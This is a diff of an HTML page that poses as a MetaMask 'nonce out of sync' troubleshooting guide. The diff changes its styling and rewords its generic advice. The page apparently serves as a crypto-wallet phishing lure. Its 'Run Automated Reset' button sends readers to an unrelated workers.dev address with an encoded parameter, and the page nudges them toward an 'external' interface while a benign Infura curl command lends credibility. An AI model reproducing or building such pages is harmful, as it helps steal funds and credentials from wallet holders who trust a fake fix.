@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: sans-serif;
-        background: #0a0c10;
+        font-family: BlinkMacSystemFont;
+        background: #121214;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -15,7 +15,7 @@
         background: #1e1f24;
         border-radius: 24px;
         padding: 2rem;
-        box-shadow: 0 4px 8px rgba(0,0,0,0.05);
+        box-shadow: none;
     }
     pre {
         background: #0f0f12;
@@ -23,9 +23,9 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #ff9455; }
     .btn {
-        background: #ff7b2c;
+        background: #ff9455;
         color: #000;
         padding: 14px 36px;
         border-radius: 40px;
@@ -41,34 +41,33 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
+<li>The user encounters a "nonce out of sync" error when attempting to send a transaction using MetaMask on the Ethereum (ETH) network, indicating a discrepancy between the expected and actual transaction count.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs when the nonce (a counter tracking the number of transactions sent from an address) stored in MetaMask does not match the nonce on the Ethereum blockchain, often due to pending or failed transactions.</li>
+<li>This error occurs when the transaction count (nonce) stored in MetaMask does not match the actual transaction count on the Ethereum blockchain, often due to pending or failed transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the MetaMask account to sync the local nonce with the blockchain:</li>
-<li>Delete the MetaMask local storage to reset account data</li>
-<li>Use the Ethereum blockchain explorer to verify the correct nonce</li>
-<li>Update the MetaMask nonce manually using the following command:</li>
+<li>Reset the account in MetaMask to resync the nonce:</li>
+<li>Update the MetaMask settings to automatically resync the account</li>
+<li>Manually increment the nonce to match the blockchain state</li>
+<li>Use the following command to check the current transaction count:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="o">{</span><span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...your_address&quot;</span>,<span class="w"> </span>
-<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...correct_nonce&quot;</span><span class="w"> </span>
-<span class="o">}</span>
+<div class="codehilite"><pre><span></span><code>curl<span class="w"> </span>-X<span class="w"> </span>GET<span class="w"> </span><span class="s1">&#39;https://mainnet.infura.io/v3/YOUR_PROJECT_ID&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-H<span class="w"> </span><span class="s1">&#39;Content-Type: application/json&#39;</span><span class="w"> </span><span class="se">\</span>
+<span class="w">     </span>-d<span class="w"> </span><span class="s1">&#39;{&quot;jsonrpc&quot;:&quot;2.0&quot;,&quot;method&quot;:&quot;eth_getTransactionCount&quot;,&quot;params&quot;:[&quot;0xYOUR_ACCOUNT_ADDRESS&quot;,&quot;latest&quot;],&quot;id&quot;:1}&#39;</span>
 </code></pre></div>
 
-<p>Consider utilizing an external interface for more direct access to your Ethereum account. </p>
+<p>Consider utilizing an external console for more complex queries.</p>
 <h2>Prerequisites</h2>
 <ul>
-<li>Access to the Ethereum blockchain explorer (e.g., Etherscan)</li>
-<li>A basic understanding of Ethereum transactions and nonces</li>
-<li>The ability to use MetaMask and its settings</li>
+<li>A MetaMask wallet installed and set up</li>
+<li>An Ethereum account with a known address</li>
+<li>Access to a blockchain API provider like Infura</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
-    <a href="https://system-edge-router.aaronjungs.workers.dev?p=ZXRo" class="btn">🛠 Run Automated Reset</a>
+    <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
 </div>
 </div>
 </body>
